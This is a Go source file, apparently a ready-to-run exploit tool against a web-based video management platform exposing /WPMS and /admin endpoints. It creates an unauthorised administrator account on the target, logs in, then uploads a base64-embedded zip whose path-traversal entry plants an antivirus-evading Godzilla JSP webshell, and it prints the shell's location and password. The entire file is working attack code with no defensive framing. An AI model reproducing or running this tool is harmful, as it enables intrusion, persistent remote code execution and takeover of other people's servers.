package main

import (
	"crypto/md5"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/retryablehttp-go"
	"io"
	mathRand "math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// 默认使用免杀哥斯拉 密码pass  访问路径/upload/sleep.jsp
var DefaultZipFile = "UEsDBBQAAAAIAIY9xVa9JDd/dgUAACk9AABKAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vb3B0L3RvbWNhdC93ZWJhcHBzL3VwbG9hZC9zbGVlcC5qc3Dtm0ty2zAMhs/SRfa2RInWTKcn6SaOkhv0/p0ImOFHQaRBv+K03nA0NEXi+QOgoZ8vP37/2e263ec49J9jDMvYfY7jtIzvyxjTynhYZpb1/bzML+v7HvPj8jwsz8tbo6yRd/fL84T1MiPrO4whrddTjmfRvEv7xD6NpL+05pJzx2X/MYC7eXu+O1RpOK4l301rqmR+fCvsIJQfsH5IewovMqNchPW7obp/kPmP9OuIPUVK8Zh4jEOyCt0T9pBRe7jO6WoJr0l6Sk+f6Ik789Zh/ZbIPM5tvNTpV3736UTZLU5r7QzL6cNs9N4ZvjrwEsBjl7SsMqlLAPagFjIamx8cPB4MtW+JBkEJzmQr37EzrTRCPodtHSmPjfryyz/CShve6hO/SskHRnK6X+tL0IO61j2BSBG/jq/QyIjnA2Tbm3exp1AlK1XLWCOSt77GGPEFNMBC6AUBdhuB5JSz2h6QWaJAWNYE0SmiA61OregddoVnOUutZZFMv/ClEXCRUg/voH9FRparylPlAN8nF0O/nrfYEo6YmdJbG3seEp2ZrKymCt5EPBHJK244dJThgxshMzohvWCRUKzoDZwW4rUgklraHjz2yZ5lpUZAxGvaZ6bTKdGW0T8kGlqjg3rKkPiS0fKS4a0baa0PZrwwPl6Qd4kMGzJGaE1njo07GAlrpGPsrsrW4jkpKSEAPTrz2WFNs+4/pbfCDJoRu9Wq4aGBOormLfCrKHdMzxtyeHxebhFN5nS6WqmNJjPkwAzN+gvriOviaiFDy07x5GbcuYrDJU/xx0GlajZSQnwM9N9otMmMlzJEXSBRO8taoa/RY1dGJh1PX5DchTmgR6rv4m6MGibbD4xH1m4L2fX9oxiRUKOPv94xK20se4go1m3rQvQrdyOBHtdDbgYTGirKLp2YSRseFFGziD9mdwUXaFl06qmXPfLpW6M2MEROV+0Pac3VIriH/tkhDeFihEbEl5mRIhoyBp2IvPARldhb+jU46LcRLXyA99f01mgyB49ts97sjQ2foK0UH+f1jFaXOD2Tod3BT7m5CSlZFPGc1huh9xFVGL3+hBzcp6tVN/pIQ+49NUqvpEHHTVQmz8ttwEHz0BrTC7Zhs6A6vxu3T7w39sQF8lXF5Ii7qVZbbdC7RyYOnHFJpsDdw2VB1VjTEDFvHHF426x8MVefQBvOCrjbEd8JZ+VCGeqaO5mHi03Gts+sN+3t0xPDz8LwJyY/MbmEyT3vmW192lqlVj30nhVra+V4omLlvUq1Ym2tlP+lirXhn8RnxfowFevosO0HrVj9lP83FavLB6dGvT9OtuPB4btkOy6cv0u206DH/z7beVagGxVoK4peUIHeKdY8WAX6xGT993aA/aPbth6jn7j9xO2vq1Jffv18WVtM1qforzNt1Sr/fM/Q3JWq0EwW+zWHnh6RYQd6QNto0YGWWu8IN10UdZlkXaqFlZlvWL0S03nulNbTUrk+67+x1llCT1C4gTLAQdsBs9HTj2rQdopn8XiGLVWrC3aQ+znN1n8Vp9XuUnbeZ3ELudENo2Z1B1evf6GrJuuwL3mB7U+Cn1pf2OindKDEzW3AjTP8ykWtoiqZ3tF9SMtn9myxPYBa0iwrJRKTa95vKrraLGRY894ZyWi1YPan11u/+GZcm8y7oboYkzQ693c4HWunb4j8GS7doPLRKMmdiRUm2nb4Xq5ut5efQoll3bHMjkxnJL8fK/Z09tif+1BWpdwprrVfypSyfsfqW/z6IusRp2YHWJqnzpH+S8l/5D7d9mIWdHRer+c3k7YnJ8eNzImcnNmsxzuMnM9D5lJvdFbR8BZjWo/fRl+38I6qR9iv9b7s25jl9J2Mry+//gJQSwECFAMUAAAACACGPcVWvSQ3f3YFAAApPQAASgAAAAAAAAAAAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vb3B0L3RvbWNhdC93ZWJhcHBzL3VwbG9hZC9zbGVlcC5qc3BQSwUGAAAAAAEAAQB4AAAA3gUAAAAA"

// RsaEncryptPKCS1v15 根据获取的公钥加密密码
func RsaEncryptPKCS1v15(publicKey string, origData []byte) (string, error) {
	pb, _ := base64.StdEncoding.DecodeString(publicKey)
	// 解析公钥
	pubInterface, err := x509.ParsePKIXPublicKey(pb)
	if err != nil {
		return "", err
	}
	// 类型断言
	pub := pubInterface.(*rsa.PublicKey)
	//加密
	ciphertext, err := rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
	encryptedText := base64.StdEncoding.EncodeToString(ciphertext)
	return encryptedText, err
}

func getPublicKey(targetURL string, loginName string, globalCookie string) string {
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)
	req, err := retryablehttp.NewRequest(http.MethodPost, targetURL+"/WPMS/getPublicKey", "{\"loginName\":\""+loginName+"\"}")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "JSESSIONID="+globalCookie)
	req.Header.Set("Accept-Encoding", "gzip")

	resp, err := client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("获取登录公钥失败: %v", err.Error())
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		gologger.Fatal().Msgf("获取登录公钥Body失败: %v", err.Error())
	}

	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		gologger.Fatal().Msgf("获取登录公钥解析Json失败: %v", err.Error())
	}

	return result["publicKey"].(string)
}

func generateRandomString(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

	mathRand.Seed(time.Now().UnixNano())

	b := make([]rune, length)
	for i := range b {
		b[i] = letters[mathRand.Intn(len(letters))]
	}
	return string(b)
}

func createAccount(targetURL string, globalCookie string) (loginName string, loginPasswd string, cookie string) {
	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	req, err := retryablehttp.NewRequest(http.MethodGet, targetURL+"/admin/sso_initSession.action", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Set("Cookie", "JSESSIONID="+globalCookie)
	req.Header.Set("Accept", "*/*")

	resp, err := client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("获取Cookie失败: %v", err.Error())
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil || len(data) != 32 {
		gologger.Fatal().Msgf("获取Cookie Body失败: %v", err.Error())
	}
	cookie = string(data)

	gologger.Info().Msgf("Cookie: %v", cookie)

	boundary := generateRandomString(8)
	body := `------b0und@ry
Content-Disposition: form-data; name="userBean.userType"

0
------b0und@ry
Content-Disposition: form-data; name="userBean.ownerCode"

001
------b0und@ry
Content-Disposition: form-data; name="userBean.isReuse"

0
------b0und@ry
Content-Disposition: form-data; name="userBean.macStat"

0
------b0und@ry
Content-Disposition: form-data; name="userBean.roleIds"

1
------b0und@ry
Content-Disposition: form-data; name="userBean.loginName"

UserN@me
------b0und@ry
Content-Disposition: form-data; name="displayedOrgName"

UserN@me
------b0und@ry
Content-Disposition: form-data; name="userBean.loginPass"

P@ssW0rd
------b0und@ry
Content-Disposition: form-data; name="checkPass"

P@ssW0rd
------b0und@ry
Content-Disposition: form-data; name="userBean.groupId"

0
------b0und@ry
Content-Disposition: form-data; name="userBean.userName"

UserN@me
------b0und@ry--
`
	loginName = generateRandomString(16)
	loginPasswd = generateRandomString(16)
	// mac的golang这么写body会丢失\x0d,踩坑了。不知道windows会不会这样
	body = strings.ReplaceAll(body, "\x0a", "\x0d\x0a")
	body = strings.ReplaceAll(body, "b0und@ry", boundary)
	body = strings.ReplaceAll(body, "UserN@me", loginName)
	body = strings.ReplaceAll(body, "P@ssW0rd", loginPasswd)

	reqAdd, err := retryablehttp.NewRequest(http.MethodPost, targetURL+"/admin/user_save.action", body)
	reqAdd.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	reqAdd.Header.Set("Content-Type", "multipart/form-data; boundary=----"+boundary)
	reqAdd.Header.Set("Accept", "*/*")
	reqAdd.Header.Set("Cookie", "JSESSIONID="+cookie)
	reqAdd.Header.Set("Accept-Encoding", "gzip")

	resp, err = client.Do(reqAdd)
	if err != nil {
		gologger.Fatal().Msgf("请求添加账户失败: %v", err.Error())
	}
	defer resp.Body.Close()

	data, err = io.ReadAll(resp.Body)
	if err != nil {
		gologger.Fatal().Msgf("获取Cookie Body失败: %v", err.Error())
	}

	if resp.StatusCode != 200 && len(data) > 0 {
		gologger.Fatal().Msgf("添加账户返回非200,或返回内容错误。当前返回值: %v", resp.StatusCode)
	}
	gologger.Info().Msgf("账户添加成功。UserName: %v Password: %v", loginName, loginPasswd)
	return loginName, loginPasswd, cookie
}

func login(targetURL string, loginName string, loginPasswd string, cookie string) string {
	publicKey := getPublicKey(targetURL, loginName, cookie)
	encryptPasswd, err := RsaEncryptPKCS1v15(publicKey, []byte(loginPasswd))
	if err != nil {
		gologger.Fatal().Msg("密码RSA加密失败！")
	}

	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)

	//currentTime := time.Now()
	//timestamp := currentTime.UnixNano()
	body := "{\"loginName\":\"" + loginName + "\",\"loginPass\":\"" + encryptPasswd + "\",\"timestamp\":\"" + "16853622671401904168273612873678126378126387" + "\"}"

	req, err := retryablehttp.NewRequest(http.MethodPost, targetURL+"/WPMS/login", body)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Cookie", "JSESSIONID="+cookie)

	resp, err := client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("请求Token失败: %v", err.Error())
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		gologger.Fatal().Msgf("获取Token Body失败: %v", err.Error())
	}

	regToken, err := regexp.Compile("\"token\":\"(.*?)\"")
	if err != nil {
		gologger.Fatal().Msg("Token Regex编译错误。")
	}
	regResult := regToken.FindAllStringSubmatch(string(data), -1)

	if len(regResult) != 1 {
		gologger.Fatal().Msg("Token解析错误。")
	}
	token := regResult[0][1]

	gologger.Info().Msgf("获取Token成功。Token: %v", token)

	req, err = retryablehttp.NewRequest(http.MethodGet, targetURL+"/admin/login_login.action?subSystemToken="+token, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Cookie", "JSESSIONID="+cookie)
	req.Header.Set("Accept-Encoding", "gzip")
	req.Header.Set("Accept", "*/*")

	resp, err = client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("获取Cookie失败: %v", err.Error())
	}

	return token
}

func getEncPass(loginName string, loginPasswd string) string {
	hash := md5.Sum([]byte(loginName + ":dss:" + loginPasswd))

	// 将 MD5 值转换为字符串
	md5str := hex.EncodeToString(hash[:])
	return md5str
}

func uploadFile(targetURL string, encPass string, zipFile string, cookie string) {
	decodeZip, err := base64.StdEncoding.DecodeString(zipFile)
	zipFile = string(decodeZip)

	opts := retryablehttp.DefaultOptionsSpraying
	client := retryablehttp.NewClient(opts)
	boundary := "WebKitFormBoundary" + generateRandomString(16)
	body := "------" + boundary + "\x0d\x0a" + "Content-Disposition: form-data; name=\"recoverFile\"; filename=\"" + generateRandomString(4) + ".zip\"" + "\x0d\x0a" + "Content-Type: application/zip" + "\x0d\x0a\x0d\x0a"
	body += zipFile + "\x0d\x0a" + "------" + boundary + "--\x20"

	req, err := retryablehttp.NewRequest(http.MethodPost, targetURL+"/admin/recover_recover.action?password="+encPass, body)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cookie", "JSESSIONID="+cookie)
	req.Header.Set("Content-Type", "multipart/form-data; boundary=----"+boundary)
	req.Header.Set("Accept-Encoding", "gzip")

	resp, err := client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("上传请求失败: %v", err.Error())
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		gologger.Fatal().Msgf("上传请求失败！状态码非200. 当前状态码: %v", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		gologger.Fatal().Msgf("获取Token Body失败: %v", err.Error())
	}
	if len(data) > 0 {
		gologger.Fatal().Msgf("上传请求失败！返回非空. 当前Body: %v", string(data))
	}
	gologger.Info().Msgf("上传请求已发送，正在测试上传是否成功。")

	req, err = retryablehttp.NewRequest(http.MethodGet, targetURL+"/upload/sleep.jsp", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
	resp, err = client.Do(req)
	if err != nil {
		gologger.Fatal().Msgf("发送WebShell校验请求失败: %v", err.Error())
	}
	if resp.StatusCode != 200 {
		gologger.Fatal().Msg("WebShell不存在，利用失败。")
	}

	gologger.Info().Msgf("上传成功！Godzilla Webshell: %s/upload/sleep.jsp", targetURL)
	gologger.Info().Msg("密码: pass 有效载荷: JavaDynamicPayload 加密器: Java_AES_BAEE64")

}

func main() {
	var URL string

	flag.StringVar(&URL, "u", "", "目标URL 例: http://10.12.4.2:8009")
	flag.Parse()

	if URL == "" {
		gologger.Fatal().Msgf("请使用-u参数输入URL")
	}

	u, err := url.Parse(URL)
	if err != nil {
		gologger.Fatal().Msgf("URL解析失败，请检查输入：%v", URL)
	}

	if !strings.Contains(u.Scheme, "http") {
		gologger.Fatal().Msgf("URL协议不为http(s)，请检查输入：%v", URL)
	}

	target := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	gologger.Info().Msgf("已设置目标: %v", target)

	globalCookie := strings.ToUpper(generateRandomString(32))
	loginName, loginPasswd, cookie := createAccount(target, globalCookie)

	login(target, loginName, loginPasswd, cookie)
	encPass := getEncPass(loginName, loginPasswd)
	uploadFile(target, encPass, DefaultZipFile, cookie)
}
